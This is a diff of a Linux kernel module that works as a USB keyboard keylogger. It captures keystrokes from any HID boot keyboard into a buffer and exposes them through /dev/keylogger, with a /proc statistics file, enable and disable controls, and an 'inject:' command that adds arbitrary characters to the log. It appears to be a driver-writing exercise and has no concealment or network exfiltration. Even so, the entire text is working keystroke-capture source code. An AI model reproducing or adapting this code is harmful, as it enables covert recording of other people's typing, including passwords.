@@ -10,637 +10,439 @@
 #include <linux/slab.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
-#include <linux/mutex.h>
 
-/*
- * - /dev is a special directory of device files.
- * - DEVICE_NAME: name of the file in /dev (e.g. /dev/keylogger).
- * - DRIVER_NAME: name the kernel uses for this driver internally.
- * - PROC_NAME: name of a stats file in /proc (e.g. /proc/keylogger_stats).
- */
 #define DEVICE_NAME "keylogger"
-#define DRIVER_NAME "keylogger"
 #define PROC_NAME   "keylogger_stats"
+#define BUF_SIZE    1024
 
-#define BUF_SIZE 1024
+// IOCTL Commands
+#define KL_MAGIC       'k'
+#define KL_RESET_STATS _IO(KL_MAGIC, 0)
+#define KL_CLEAR_BUF   _IO(KL_MAGIC, 1)
+#define KL_ENABLE      _IO(KL_MAGIC, 2)
+#define KL_DISABLE     _IO(KL_MAGIC, 3)
 
-/*
- * IOCTL commands:
- * - IOCTL = special control command from user space to the driver.
- * - KEYLOGGER_IOC_MAGIC: small ID ('k') used for all our IOCTLs.
- *
- * Commands:
- * - RESET_STATS: reset statistics counters.
- * - CLEAR_BUFFER: clear the ring buffer of characters.
- * - ENABLE: turn logging on.
- * - DISABLE: turn logging off.
- */
-#define KEYLOGGER_IOC_MAGIC        'k'
-#define KEYLOGGER_IOC_RESET_STATS  _IO(KEYLOGGER_IOC_MAGIC, 0)
-#define KEYLOGGER_IOC_CLEAR_BUFFER _IO(KEYLOGGER_IOC_MAGIC, 1)
-#define KEYLOGGER_IOC_ENABLE       _IO(KEYLOGGER_IOC_MAGIC, 2)
-#define KEYLOGGER_IOC_DISABLE      _IO(KEYLOGGER_IOC_MAGIC, 3)
-
-/*
- * simple_usage_to_ascii:
- * Turn a HID key code (one byte) into a simple ASCII character.
- * Returns 0 if the code is not supported.
- */
-static char simple_usage_to_ascii(u8 usage)
-{
-    if (usage >= 0x04 && usage <= 0x1d)
-        return 'a' + (usage - 0x04);   /* letters a–z */
-
-    if (usage >= 0x1e && usage <= 0x26)
-        return '1' + (usage - 0x1e);   /* digits 1–9 */
-
-    if (usage == 0x27)
-        return '0';                    /* digit 0 */
-
-    if (usage == 0x2c)
-        return ' ';                    /* space */
-
-    if (usage == 0x28)
-        return '\n';                   /* Enter */
-
-    return 0;
-}
-
-/*
- * struct keylogger_dev:
- * Holds all state for one keylogger device.
- *
- * - devno, cdev, cls, device: used to create /dev/keylogger.
- * - buf, buf_size: character ring buffer and its size.
- * - head, tail, full: position and full flag for the ring buffer.
- * - lock: spinlock to protect buffer and counters.
- * - read_q, write_q: wait queues for blocking reads/writes.
- * - keys_captured, bytes_read, overflows, opens: statistics.
- * - logging_enabled: whether key logging is on.
- * - usbdev: pointer to the USB keyboard.
- * - irq_urb, irq_buf, irq_dma: USB interrupt transfer state.
- * - irq_interval, irq_pipe: timing and pipe for USB interrupt.
- */
-struct keylogger_dev {
+// Essential parts of driver
+struct dev {
     dev_t devno;
     struct cdev cdev;
     struct class *cls;
-    struct device *device;
 
-    char *buf;
-    size_t buf_size;
-    size_t head;
-    size_t tail;
-    bool   full;
+    char buf[BUF_SIZE];
+    size_t head, tail;
+    bool full;
 
     spinlock_t lock;
-    wait_queue_head_t read_q;
-    wait_queue_head_t write_q;
+    wait_queue_head_t rq, wq;
 
-    u64 keys_captured;
-    u64 bytes_read;
-    u64 overflows;
-    u64 opens;
+    u64 chars_logged, bytes_read, bytes_written;
+    u64 overflows, opens;
+    bool enabled;
 
-    bool logging_enabled;
-
-    struct usb_device *usbdev;
-    struct urb *irq_urb;
+    struct usb_device *udev;
+    struct urb *urb;
     unsigned char *irq_buf;
     dma_addr_t irq_dma;
-    int irq_interval;
-    int irq_pipe;
+    int irq_maxp;              // max packet size for irq_buf
 };
 
-/* Global device pointer and /proc entry pointer. */
-static struct keylogger_dev *g_dev;
-static struct proc_dir_entry *proc_entry;
+static struct dev *kl;
 
-/*
- * Ring buffer helpers:
- * - buffer_is_empty: true if nothing to read.
- * - buffer_is_full: true if no free space.
- */
-static bool buffer_is_empty(struct keylogger_dev *dev)
+static char hid_to_char(u8 c)
 {
-    return (!dev->full && (dev->head == dev->tail));
+    if (c >= 0x04 && c <= 0x1d) return 'a' + (c - 0x04);
+    if (c >= 0x1e && c <= 0x26) return '1' + (c - 0x1e);
+    if (c == 0x27) return '0';
+    if (c == 0x2c) return ' ';
+    if (c == 0x28) return '\n';
+    return 0;
 }
 
-static bool buffer_is_full(struct keylogger_dev *dev)
+static bool buf_empty(struct dev *d) { return !d->full && d->head == d->tail; }
+static bool buf_full(struct dev *d)  { return d->full; }
+
+static void buf_clear(struct dev *d)
 {
-    return dev->full;
+    d->head = d->tail = 0;
+    d->full = false;
 }
 
-/*
- * buffer_put_char:
- * Store one character into the ring buffer.
- */
-static void buffer_put_char(struct keylogger_dev *dev, char ch)
+static void buf_push(struct dev *d, char ch)
 {
-    dev->buf[dev->head] = ch;
-    dev->head = (dev->head + 1) % dev->buf_size;
-
-    if (dev->head == dev->tail)
-        dev->full = true;
+    d->buf[d->head] = ch;
+    d->head = (d->head + 1) % BUF_SIZE;
+    if (d->head == d->tail)
+        d->full = true;
 }
 
-/*
- * buffer_get:
- * Copy up to 'max' characters from the ring buffer into dst.
- * Returns how many characters were copied.
- */
-static size_t buffer_get(struct keylogger_dev *dev, char *dst, size_t max)
+static size_t buf_pop(struct dev *d, char *out, size_t n)
 {
-    size_t copied = 0;
+    size_t i = 0;
 
-    while (!buffer_is_empty(dev) && copied < max) {
-        dst[copied++] = dev->buf[dev->tail];
-        dev->tail = (dev->tail + 1) % dev->buf_size;
-        dev->full = false;
+    while (!buf_empty(d) && i < n) {
+        out[i++] = d->buf[d->tail];
+        d->tail = (d->tail + 1) % BUF_SIZE;
+        d->full = false;
     }
-
-    return copied;
+    return i;
 }
 
-/*
- * keylogger_irq:
- * Called each time the keyboard sends a USB report.
- * Decodes pressed keys and stores characters into the ring buffer.
- */
-static void keylogger_irq(struct urb *urb)
+// interrupt handler that runs whenever the keyboard sends data to your driver
+static void kl_irq(struct urb *urb)
 {
-    struct keylogger_dev *dev = urb->context;
+    struct dev *d = urb->context;  // URB sets up pointer reference to dev
     unsigned long flags;
     int i;
-    u8 *data = dev->irq_buf;   /* 8-byte HID report from the keyboard */
 
-    if (urb->status)
-        goto resubmit;         /* On error: skip work and re-arm the URB. */
+    if (urb->status)               // if the last URB transfer failed
+        goto resubmit;             // queue the URB again
 
-    spin_lock_irqsave(&dev->lock, flags);
-
-    if (dev->logging_enabled) {
-        /* Bytes 2–7 contain up to 6 key codes. */
+    spin_lock_irqsave(&d->lock, flags);  // only this code can touch the shared buffer and stats while it runs
+    if (d->enabled)                // if the keylogger is turned on
+    {
         for (i = 2; i < 8; i++) {
-            u8 usage = data[i];
-            char ch;
-
-            if (!usage)
-                continue;      /* 0: no key in this slot. */
-
-            ch = simple_usage_to_ascii(usage);
-            if (!ch)
-                continue;      /* Unsupported usage. */
-
-            if (buffer_is_full(dev)) {
-                dev->overflows++;
-                continue;      /* Drop if buffer is full. */
-            }
-
-            buffer_put_char(dev, ch);
-            dev->keys_captured++;
+            char ch = hid_to_char(d->irq_buf[i]); // convert to character
+            if (!ch) continue;
+            if (buf_full(d)) { d->overflows++; continue; } // dont add anything
+            buf_push(d, ch);      // add the character
+            d->chars_logged++;
         }
-
-        if (!buffer_is_empty(dev))
-            wake_up_interruptible(&dev->read_q);
+        if (!buf_empty(d))
+            wake_up_interruptible(&d->rq); // wake up reader threads if buf isnt empty
     }
-
-    spin_unlock_irqrestore(&dev->lock, flags);
+    spin_unlock_irqrestore(&d->lock, flags); // release lock
 
 resubmit:
-    usb_submit_urb(urb, GFP_ATOMIC);   /* Re-arm URB for next report. */
+    usb_submit_urb(urb, GFP_ATOMIC);
 }
 
-/*
- * keylogger_probe:
- * Called when a matching USB keyboard is plugged in.
- * Sets up USB interrupt transfer and buffer.
- */
-static int keylogger_probe(struct usb_interface *intf,
-                           const struct usb_device_id *id)
+// “setup” function that runs when a USB keyboard matching your ID table is plugged in
+static int kl_probe(struct usb_interface *intf, const struct usb_device_id *id)
 {
-    struct usb_device *udev = interface_to_usbdev(intf);
-    struct usb_host_interface *iface_desc;
-    struct usb_endpoint_descriptor *endpoint;
-    int pipe, maxp;
-    int error;
+    struct usb_endpoint_descriptor *ep; // points to the USB endpoint description
+    int pipe, maxp, err;
 
-    if (!g_dev)
+    if (!kl)              // if your global driver state kl has not been initialized
         return -ENODEV;
 
-    iface_desc = intf->cur_altsetting;
-    if (iface_desc->desc.bNumEndpoints < 1)
+    if (intf->cur_altsetting->desc.bNumEndpoints < 1) // if this USB interface has no endpoints
         return -ENODEV;
 
-    endpoint = &iface_desc->endpoint[0].desc;
-    if (!usb_endpoint_is_int_in(endpoint))
+    ep = &intf->cur_altsetting->endpoint[0].desc;     // get first endpoint descriptor
+    if (!usb_endpoint_is_int_in(ep))                 // is this an interrupt in endpoint?
         return -ENODEV;
 
-    pipe = usb_rcvintpipe(udev, endpoint->bEndpointAddress);
-    maxp = usb_maxpacket(udev, pipe, usb_pipeout(pipe));
+    kl->udev = interface_to_usbdev(intf);
+    pipe = usb_rcvintpipe(kl->udev, ep->bEndpointAddress);   // receive interrupt data from this endpoint address
+    maxp = usb_maxpacket(kl->udev, pipe, 0);                 // maximum packet size
+    kl->irq_maxp = maxp;
 
-    g_dev->usbdev       = udev;
-    g_dev->irq_interval = endpoint->bInterval;
-    g_dev->irq_pipe     = pipe;
-
-    g_dev->irq_buf = usb_alloc_coherent(udev, maxp, GFP_ATOMIC,
-                                        &g_dev->irq_dma);
-    if (!g_dev->irq_buf)
+    kl->irq_buf = usb_alloc_coherent(kl->udev, maxp, GFP_ATOMIC, &kl->irq_dma);
+    // allocate safe buffer of size maxp for incoming interrupt data
+    if (!kl->irq_buf)
         return -ENOMEM;
 
-    g_dev->irq_urb = usb_alloc_urb(0, GFP_KERNEL);
-    if (!g_dev->irq_urb) {
-        usb_free_coherent(udev, maxp, g_dev->irq_buf, g_dev->irq_dma);
-        g_dev->irq_buf = NULL;
+    // allocate an empty URB object
+    kl->urb = usb_alloc_urb(0, GFP_KERNEL);
+    if (!kl->urb) {
+        usb_free_coherent(kl->udev, maxp, kl->irq_buf, kl->irq_dma);
+        kl->irq_buf = NULL;
         return -ENOMEM;
     }
 
-    usb_fill_int_urb(g_dev->irq_urb, udev, pipe,
-                     g_dev->irq_buf, maxp, keylogger_irq,
-                     g_dev, g_dev->irq_interval);
+    usb_fill_int_urb(kl->urb, kl->udev, pipe, kl->irq_buf, maxp,
+                     kl_irq, kl, ep->bInterval);
+    kl->urb->transfer_dma = kl->irq_dma;
+    kl->urb->transfer_flags |= URB_NO_TRANSFER_DMA_MAP;
 
-    g_dev->irq_urb->transfer_dma = g_dev->irq_dma;
-    g_dev->irq_urb->transfer_flags |= URB_NO_TRANSFER_DMA_MAP;
-
-    error = usb_submit_urb(g_dev->irq_urb, GFP_KERNEL);
-    if (error) {
-        usb_free_urb(g_dev->irq_urb);
-        g_dev->irq_urb = NULL;
-        usb_free_coherent(udev, maxp, g_dev->irq_buf, g_dev->irq_dma);
-        g_dev->irq_buf = NULL;
-        return error;
+    err = usb_submit_urb(kl->urb, GFP_ATOMIC);
+    // Queue the URB to the USB core so it starts receiving keyboard interrupt packets
+    if (err) {
+        usb_free_urb(kl->urb);
+        usb_free_coherent(kl->udev, maxp, kl->irq_buf, kl->irq_dma);
+        kl->urb = NULL;
+        kl->irq_buf = NULL;
+        return err;
     }
 
     dev_info(&intf->dev, "keylogger attached\n");
     return 0;
 }
 
-/*
- * keylogger_disconnect:
- * Called when the keyboard is unplugged.
- * Stops USB transfers and frees USB-related memory.
- */
-static void keylogger_disconnect(struct usb_interface *intf)
+// cleanup when the keyboard is unplugged
+static void kl_disconnect(struct usb_interface *intf)
 {
-    struct usb_device *udev = interface_to_usbdev(intf);
-
-    if (!g_dev || g_dev->usbdev != udev)
+    if (!kl || kl->udev != interface_to_usbdev(intf))
         return;
 
-    if (g_dev->irq_urb) {
-        usb_kill_urb(g_dev->irq_urb);
-        usb_free_urb(g_dev->irq_urb);
-        g_dev->irq_urb = NULL;
+    // "delete" URB
+    if (kl->urb) {
+        usb_kill_urb(kl->urb);
+        usb_free_urb(kl->urb);
+        kl->urb = NULL;
     }
-
-    if (g_dev->irq_buf) {
-        usb_free_coherent(udev,
-                          g_dev->irq_urb->transfer_buffer_length,
-                          g_dev->irq_buf, g_dev->irq_dma);
-        g_dev->irq_buf = NULL;
+    if (kl->irq_buf) {
+        usb_free_coherent(kl->udev, kl->irq_maxp, kl->irq_buf, kl->irq_dma);
+        kl->irq_buf = NULL;
     }
-
-    g_dev->usbdev = NULL;
+    // forget the USB device pointer
+    kl->udev = NULL;
 }
 
-/*
- * USB ID table:
- * Match any HID boot keyboard interface.
- */
-static const struct usb_device_id keylogger_table[] = {
-    {
-        USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID,
-                           USB_INTERFACE_SUBCLASS_BOOT,
-                           USB_INTERFACE_PROTOCOL_KEYBOARD)
-    },
-    { } /* terminating entry */
+// which USB devices should this driver bind to?
+static const struct usb_device_id kl_id_table[] = {
+    { USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID,
+                         USB_INTERFACE_SUBCLASS_BOOT,
+                         USB_INTERFACE_PROTOCOL_KEYBOARD) },
+    { }
 };
-MODULE_DEVICE_TABLE(usb, keylogger_table);
+// exposes this ID table to userspace tools
+MODULE_DEVICE_TABLE(usb, kl_id_table);
 
-/*
- * USB driver description:
- * Connects probe/disconnect to the USB core.
- */
-static struct usb_driver keylogger_usb_driver = {
-    .name       = DRIVER_NAME,
-    .probe      = keylogger_probe,
-    .disconnect = keylogger_disconnect,
-    .id_table   = keylogger_table,
+// tells the USB core how to talk to you
+static struct usb_driver kl_usb = {
+    .name       = DEVICE_NAME,
+    .probe      = kl_probe,
+    .disconnect = kl_disconnect,
+    .id_table   = kl_id_table,
 };
 
-/*
- * keylogger_open:
- * Called when user opens /dev/keylogger.
- */
-static int keylogger_open(struct inode *inode, struct file *filp)
+// when open("/dev/keylogger", ...)
+static int kl_open(struct inode *ino, struct file *f)
 {
-    struct keylogger_dev *dev = container_of(inode->i_cdev,
-                                             struct keylogger_dev, cdev);
-
-    filp->private_data = dev;
-    dev->opens++;
+    f->private_data = kl;
+    kl->opens++;
     return 0;
 }
 
-/*
- * keylogger_release:
- * Called when user closes /dev/keylogger.
- */
-static int keylogger_release(struct inode *inode, struct file *filp)
+// takes characters from your internal buffer and gives them to userspace
+static ssize_t kl_read(struct file *f, char __user *ubuf, size_t len, loff_t *off)
 {
-    return 0;
-}
-
-/*
- * keylogger_read:
- * Called when user reads from /dev/keylogger.
- * Returns logged characters from the ring buffer.
- */
-static ssize_t keylogger_read(struct file *filp, char __user *buf,
-                              size_t count, loff_t *ppos)
-{
-    struct keylogger_dev *dev = filp->private_data;
+    unsigned long flags;
+    char *tmp;
+    size_t n;
     int ret;
-    unsigned long flags;
-    char *kbuf;
-    size_t copied;
 
-    if (count == 0)
-        return 0;
+    if (!len) return 0;
 
-    if (buffer_is_empty(dev)) {
-        if (filp->f_flags & O_NONBLOCK)
-            return -EAGAIN;
-
-        ret = wait_event_interruptible(dev->read_q,
-                                       !buffer_is_empty(dev));
-        if (ret)
-            return ret;
+    if (buf_empty(kl)) {
+        if (f->f_flags & O_NONBLOCK) return -EAGAIN;           // if non blocking file error
+        ret = wait_event_interruptible(kl->rq, !buf_empty(kl)); // if not sleep
+        if (ret) return ret;
     }
 
-    kbuf = kmalloc(count, GFP_KERNEL);
-    if (!kbuf)
-        return -ENOMEM;
+    tmp = kmalloc(len, GFP_KERNEL);
+    if (!tmp) return -ENOMEM;
 
-    spin_lock_irqsave(&dev->lock, flags);
-    copied = buffer_get(dev, kbuf, count);
-    dev->bytes_read += copied;
-    spin_unlock_irqrestore(&dev->lock, flags);
+    spin_lock_irqsave(&kl->lock, flags);
+    n = buf_pop(kl, tmp, len);  // copy from ring buffer
+    kl->bytes_read += n;
+    spin_unlock_irqrestore(&kl->lock, flags);
 
-    if (copy_to_user(buf, kbuf, copied)) {
-        kfree(kbuf);
-        return -EFAULT;
-    }
+    ret = copy_to_user(ubuf, tmp, n) ? -EFAULT : (ssize_t)n;
+    // copy n bytes from the kernel buffer tmp into the user’s buffer ubuf
+    kfree(tmp);
 
-    kfree(kbuf);
-    wake_up_interruptible(&dev->write_q);
-    return copied;
+    wake_up_interruptible(&kl->wq);
+    return ret;
 }
 
-/*
- * keylogger_write:
- * Called when user writes to /dev/keylogger.
- * Accepts simple commands: "clear", "enable", "disable".
- */
-static ssize_t keylogger_write(struct file *filp, const char __user *buf,
-                               size_t count, loff_t *ppos)
+// Called when a process does write(fd, ubuf, len) on your device.
+static ssize_t kl_write(struct file *f, const char __user *ubuf,
+                        size_t len, loff_t *off)
 {
-    struct keylogger_dev *dev = filp->private_data;
-    char kbuf[64];
     unsigned long flags;
+    char *tmp;
+    size_t i;
 
-    if (count > sizeof(kbuf) - 1)
-        count = sizeof(kbuf) - 1;
+    if (!len) return 0;
 
-    if (copy_from_user(kbuf, buf, count))
-        return -EFAULT;
+    tmp = kmalloc(len + 1, GFP_KERNEL);
+    if (!tmp) return -ENOMEM;
+    if (copy_from_user(tmp, ubuf, len)) { kfree(tmp); return -EFAULT; }
+    tmp[len] = '\0';
 
-    kbuf[count] = '\0';
-
-    if (!strncmp(kbuf, "clear", 5)) {
-        spin_lock_irqsave(&dev->lock, flags);
-        dev->head = dev->tail = 0;
-        dev->full = false;
-        spin_unlock_irqrestore(&dev->lock, flags);
-        wake_up_interruptible(&dev->write_q);
-        return count;
+    if (!strncmp(tmp, "clear", 5)) {
+        spin_lock_irqsave(&kl->lock, flags);
+        buf_clear(kl);
+        spin_unlock_irqrestore(&kl->lock, flags);
+    } else if (!strncmp(tmp, "enable", 6)) {
+        kl->enabled = true;
+    } else if (!strncmp(tmp, "disable", 7)) {
+        kl->enabled = false;
+    } else if (!strncmp(tmp, "inject:", 7)) {
+        for (i = 7; tmp[i]; i++) {
+            int ret;
+            while (buf_full(kl)) {
+                ret = wait_event_interruptible(kl->wq, !buf_full(kl));
+                if (ret) { kfree(tmp); return ret; }
+            }
+            spin_lock_irqsave(&kl->lock, flags);
+            if (!buf_full(kl)) {
+                buf_push(kl, tmp[i]);
+                kl->bytes_written++;
+            }
+            spin_unlock_irqrestore(&kl->lock, flags);
+            wake_up_interruptible(&kl->rq);
+        }
+    } else {
+        kl->bytes_written += len;
     }
 
-    if (!strncmp(kbuf, "enable", 6)) {
-        dev->logging_enabled = true;
-        return count;
-    }
-
-    if (!strncmp(kbuf, "disable", 7)) {
-        dev->logging_enabled = false;
-        return count;
-    }
-
-    return count;
+    kfree(tmp);
+    return len;
 }
 
-/*
- * keylogger_ioctl:
- * Called when user sends an IOCTL to /dev/keylogger.
- * Handles reset/clear/enable/disable commands.
- */
-static long keylogger_ioctl(struct file *filp,
-                            unsigned int cmd, unsigned long arg)
+// user space calls ioctl(fd, CMD, arg) to reset stats or clear the buffer
+static long kl_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 {
-    struct keylogger_dev *dev = filp->private_data;
     unsigned long flags;
 
     switch (cmd) {
-    case KEYLOGGER_IOC_RESET_STATS:
-        spin_lock_irqsave(&dev->lock, flags);
-        dev->keys_captured = 0;
-        dev->bytes_read    = 0;
-        dev->overflows     = 0;
-        dev->opens         = 0;
-        spin_unlock_irqrestore(&dev->lock, flags);
+    case KL_RESET_STATS:
+        spin_lock_irqsave(&kl->lock, flags);
+        kl->chars_logged = kl->bytes_read = kl->bytes_written = 0;
+        kl->overflows = kl->opens = 0;
+        spin_unlock_irqrestore(&kl->lock, flags);
         break;
-
-    case KEYLOGGER_IOC_CLEAR_BUFFER:
-        spin_lock_irqsave(&dev->lock, flags);
-        dev->head = dev->tail = 0;
-        dev->full = false;
-        spin_unlock_irqrestore(&dev->lock, flags);
-        wake_up_interruptible(&dev->write_q);
+    case KL_CLEAR_BUF:
+        spin_lock_irqsave(&kl->lock, flags);
+        buf_clear(kl);
+        spin_unlock_irqrestore(&kl->lock, flags);
+        wake_up_interruptible(&kl->wq);
         break;
-
-    case KEYLOGGER_IOC_ENABLE:
-        dev->logging_enabled = true;
+    case KL_ENABLE:
+        kl->enabled = true;
         break;
-
-    case KEYLOGGER_IOC_DISABLE:
-        dev->logging_enabled = false;
+    case KL_DISABLE:
+        kl->enabled = false;
         break;
-
     default:
         return -ENOTTY;
     }
-
     return 0;
 }
 
-/*
- * File operations for /dev/keylogger.
- */
-static const struct file_operations keylogger_fops = {
+// tells the kernel which functions to call when a process uses /dev/keylogger
+static const struct file_operations kl_fops = {
     .owner          = THIS_MODULE,
-    .open           = keylogger_open,
-    .release        = keylogger_release,
-    .read           = keylogger_read,
-    .write          = keylogger_write,
-    .unlocked_ioctl = keylogger_ioctl,
+    .open           = kl_open,
+    .read           = kl_read,
+    .write          = kl_write,
+    .unlocked_ioctl = kl_ioctl,
 };
 
-/*
- * keylogger_proc_show:
- * Called when user reads /proc/keylogger_stats.
- * Prints simple statistics.
- */
-static int keylogger_proc_show(struct seq_file *m, void *v)
+// what /proc/keylogger_stats prints
+static int kl_proc_show(struct seq_file *m, void *v)
 {
-    struct keylogger_dev *dev = g_dev;
-
-    if (!dev)
-        return 0;
-
-    seq_printf(m, "keys_captured: %llu\n", dev->keys_captured);
-    seq_printf(m, "bytes_read:    %llu\n", dev->bytes_read);
-    seq_printf(m, "buffer_size:   %zu\n",  dev->buf_size);
-    seq_printf(m, "overflows:     %llu\n", dev->overflows);
-    seq_printf(m, "opens:         %llu\n", dev->opens);
+    if (!kl) return 0;
+    seq_printf(m, "chars_logged:  %llu\n"
+                  "bytes_read:    %llu\n"
+                  "bytes_written: %llu\n"
+                  "buffer_size:   %d\n"
+                  "overflows:     %llu\n"
+                  "opens:         %llu\n"
+                  "enabled:       %d\n",
+           kl->chars_logged, kl->bytes_read, kl->bytes_written,
+           BUF_SIZE, kl->overflows, kl->opens, kl->enabled ? 1 : 0);
     return 0;
 }
 
-/*
- * keylogger_proc_open:
- * Setup for reading /proc/keylogger_stats.
- */
-static int keylogger_proc_open(struct inode *inode, struct file *file)
+// opening the proc entry
+static int kl_proc_open(struct inode *ino, struct file *f)
 {
-    return single_open(file, keylogger_proc_show, NULL);
+    return single_open(f, kl_proc_show, NULL);
 }
 
-/*
- * File operations for /proc/keylogger_stats.
- */
-static const struct file_operations keylogger_proc_fops = {
+// how /proc/keylogger_stats behaves
+static const struct file_operations kl_proc_fops = {
     .owner   = THIS_MODULE,
-    .open    = keylogger_proc_open,
+    .open    = kl_proc_open,
     .read    = seq_read,
     .llseek  = seq_lseek,
     .release = single_release,
 };
 
-/*
- * keylogger_init:
- * Called when the module is loaded.
- * Sets up memory, /dev, /proc, and registers the USB driver.
- */
-static int __init keylogger_init(void)
+static int __init kl_init(void)
 {
     int ret;
 
-    g_dev = kzalloc(sizeof(*g_dev), GFP_KERNEL);
-    if (!g_dev)
-        return -ENOMEM;
+    // Allocate and zero your main driver struct kl
+    kl = kzalloc(sizeof(*kl), GFP_KERNEL);
+    if (!kl) return -ENOMEM;
 
-    g_dev->buf_size = BUF_SIZE;
-    g_dev->buf = kmalloc(g_dev->buf_size, GFP_KERNEL);
-    if (!g_dev->buf) {
-        kfree(g_dev);
-        g_dev = NULL;
-        return -ENOMEM;
-    }
+    // Initialize the spinlock and both wait queues
+    spin_lock_init(&kl->lock);
+    init_waitqueue_head(&kl->rq);
+    init_waitqueue_head(&kl->wq);
+    kl->enabled = true;
 
-    spin_lock_init(&g_dev->lock);
-    init_waitqueue_head(&g_dev->read_q);
-    init_waitqueue_head(&g_dev->write_q);
-    g_dev->logging_enabled = true;
+    // Ask the kernel for a free major/minor number for your character device and store it in kl->devno
+    ret = alloc_chrdev_region(&kl->devno, 0, 1, DEVICE_NAME);
+    if (ret) goto fail_free;
 
-    ret = alloc_chrdev_region(&g_dev->devno, 0, 1, DRIVER_NAME);
-    if (ret < 0)
-        goto err_buf;
+    // Initialize a cdev with your kl_fops and register it
+    cdev_init(&kl->cdev, &kl_fops);
+    ret = cdev_add(&kl->cdev, kl->devno, 1);
+    if (ret) goto fail_region;
 
-    cdev_init(&g_dev->cdev, &keylogger_fops);
-    g_dev->cdev.owner = THIS_MODULE;
-    ret = cdev_add(&g_dev->cdev, g_dev->devno, 1);
-    if (ret < 0)
-        goto err_chrdev;
+    // Create a device class under /sys/class/ to group your device
+    kl->cls = class_create(THIS_MODULE, DEVICE_NAME);
+    if (IS_ERR(kl->cls)) { ret = PTR_ERR(kl->cls); goto fail_cdev; }
 
-    g_dev->cls = class_create(THIS_MODULE, DRIVER_NAME);
-    if (IS_ERR(g_dev->cls)) {
-        ret = PTR_ERR(g_dev->cls);
-        goto err_cdev;
-    }
-
-    g_dev->device = device_create(g_dev->cls, NULL, g_dev->devno,
-                                  NULL, DEVICE_NAME);
-    if (IS_ERR(g_dev->device)) {
-        ret = PTR_ERR(g_dev->device);
-        goto err_class;
-    }
-
-    proc_entry = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_fops);
-    if (!proc_entry) {
+    // Create the actual device node so /dev/keylogger appears
+    if (IS_ERR(device_create(kl->cls, NULL, kl->devno, NULL, DEVICE_NAME))) {
         ret = -ENOMEM;
-        goto err_device;
+        goto fail_class;
     }
 
-    ret = usb_register(&keylogger_usb_driver);
-    if (ret)
-        goto err_proc;
+    // Create /proc/keylogger_stats with read‑only
+    if (!proc_create(PROC_NAME, 0444, NULL, &kl_proc_fops)) {
+        ret = -ENOMEM;
+        goto fail_dev;
+    }
 
-    pr_info("keylogger: module loaded\n");
+    // Register your USB driver (kl_usb) with the USB core
+    ret = usb_register(&kl_usb);
+    if (ret) goto fail_proc;
+
+    pr_info("keylogger: loaded\n");
     return 0;
 
-err_proc:
+fail_proc:
     remove_proc_entry(PROC_NAME, NULL);
-err_device:
-    device_destroy(g_dev->cls, g_dev->devno);
-err_class:
-    class_destroy(g_dev->cls);
-err_cdev:
-    cdev_del(&g_dev->cdev);
-err_chrdev:
-    unregister_chrdev_region(g_dev->devno, 1);
-err_buf:
-    kfree(g_dev->buf);
-    kfree(g_dev);
-    g_dev = NULL;
+fail_dev:
+    device_destroy(kl->cls, kl->devno);
+fail_class:
+    class_destroy(kl->cls);
+fail_cdev:
+    cdev_del(&kl->cdev);
+fail_region:
+    unregister_chrdev_region(kl->devno, 1);
+fail_free:
+    kfree(kl); kl = NULL;
     return ret;
 }
 
-/*
- * keylogger_exit:
- * Called when the module is unloaded.
- * Unregisters USB driver, removes /dev and /proc entries, frees memory.
- */
-static void __exit keylogger_exit(void)
+static void __exit kl_exit(void)
 {
-    if (!g_dev)
-        return;
-
-    usb_deregister(&keylogger_usb_driver);
+    // remove everything
+    if (!kl) return;
+    usb_deregister(&kl_usb);
     remove_proc_entry(PROC_NAME, NULL);
-    device_destroy(g_dev->cls, g_dev->devno);
-    class_destroy(g_dev->cls);
-    cdev_del(&g_dev->cdev);
-    unregister_chrdev_region(g_dev->devno, 1);
-
-    kfree(g_dev->buf);
-    kfree(g_dev);
-    g_dev = NULL;
-
-    pr_info("keylogger: module unloaded\n");
+    device_destroy(kl->cls, kl->devno);
+    class_destroy(kl->cls);
+    cdev_del(&kl->cdev);
+    unregister_chrdev_region(kl->devno, 1);
+    kfree(kl); kl = NULL;
+    pr_info("keylogger: unloaded\n");
 }
 
-module_init(keylogger_init);
-module_exit(keylogger_exit);
+module_init(kl_init);
+module_exit(kl_exit);
 
+// Metadata
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
-MODULE_DESCRIPTION("USB keyboard keylogger char device driver");
+MODULE_AUTHOR("JimBob");
+MODULE_DESCRIPTION("Simple USB keyboard keylogger");
+
